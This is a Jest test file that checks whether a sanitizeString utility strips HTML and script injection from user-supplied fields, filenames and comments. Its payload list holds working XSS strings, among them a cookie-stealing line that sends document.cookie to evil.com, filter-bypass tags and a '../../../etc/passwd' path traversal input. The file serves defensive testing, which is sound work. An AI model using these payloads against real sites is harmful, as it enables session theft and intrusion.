/**
 * XSS Prevention Tests
 *
 * Verifies that HTML/JavaScript injection is properly
 * stripped or escaped by the sanitization utilities.
 */

const { sanitizeString } = require('../../src/utils/validation');

const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert(1)>',
  'javascript:alert("XSS")',
  '<a href="javascript:alert(1)">click</a>',
  '<div onmouseover="alert(1)">hover</div>',
  '"><script>alert(document.cookie)</script>',
  '<iframe src="https://evil.com"></iframe>',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  "<img src='x' onerror='fetch(\"https://evil.com?c=\"+document.cookie)'>",
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  "'-alert(1)-'",
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
];

describe('XSS Prevention', () => {
  describe('sanitizeString strips HTML tags', () => {
    test.each(XSS_PAYLOADS)(
      'should strip: %s',
      (payload) => {
        const result = sanitizeString(payload);
        if (result !== null) {
          // No HTML tags should remain
          expect(result).not.toMatch(/<[a-z][^>]*>/i);
          // No script tags
          expect(result.toLowerCase()).not.toContain('<script');
          expect(result.toLowerCase()).not.toContain('</script');
          // No event handlers in tags
          expect(result).not.toMatch(/on\w+\s*=/i);
        }
      }
    );
  });

  describe('sanitizeString handles edge cases', () => {
    test('should strip nested tags', () => {
      const result = sanitizeString('<div><script>alert(1)</script></div>');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    test('should handle empty tags', () => {
      const result = sanitizeString('<></>');
      // After stripping tags, may be empty
      expect(result === null || !result.includes('<')).toBe(true);
    });

    test('should preserve non-HTML text', () => {
      const result = sanitizeString('Hello World! 2 < 3 means something');
      expect(result).toContain('Hello World!');
    });

    test('should strip HTML but preserve readable content', () => {
      const result = sanitizeString('<b>Bold</b> and <i>italic</i> text');
      expect(result).toContain('Bold');
      expect(result).toContain('italic');
      expect(result).toContain('text');
      expect(result).not.toContain('<b>');
      expect(result).not.toContain('<i>');
    });

    test('should handle HTML entities in context', () => {
      const result = sanitizeString('test &lt;script&gt; end');
      // HTML entities are NOT stripped by stripHtml (they're text, not tags)
      expect(result).toContain('test');
      expect(result).toContain('end');
    });

    test('should limit output length', () => {
      const longXss = '<script>' + 'A'.repeat(500) + '</script>';
      const result = sanitizeString(longXss, 100);
      expect(result.length).toBeLessThanOrEqual(100);
    });
  });

  describe('User-generated content fields', () => {
    test('should sanitize employee names', () => {
      const result = sanitizeString('<script>alert(1)</script>John');
      expect(result).not.toContain('<script>');
      expect(result).toContain('John');
    });

    test('should sanitize ticket titles', () => {
      const result = sanitizeString('Bug report <img src=x onerror=alert(1)>');
      expect(result).not.toContain('<img');
      expect(result).toContain('Bug report');
    });

    test('should sanitize comments', () => {
      const result = sanitizeString(
        'This is a comment <div onmouseover="steal()">with hover trap</div>'
      );
      expect(result).not.toContain('onmouseover');
      expect(result).toContain('This is a comment');
    });

    test('should sanitize descriptions', () => {
      const result = sanitizeString(
        'Normal text<iframe src="evil.com"></iframe> more text',
        10000
      );
      expect(result).not.toContain('<iframe');
      expect(result).toContain('Normal text');
      expect(result).toContain('more text');
    });
  });

  describe('Uploaded filename sanitization', () => {
    test('should handle filenames with HTML', () => {
      const result = sanitizeString('<script>alert(1)</script>.pdf');
      expect(result).not.toContain('<script>');
    });

    test('should handle filenames with path traversal', () => {
      const result = sanitizeString('../../../etc/passwd');
      // sanitizeString doesn't handle path traversal (that's multer's job)
      // but it should at least return without HTML
      expect(result).not.toContain('<');
    });
  });
});
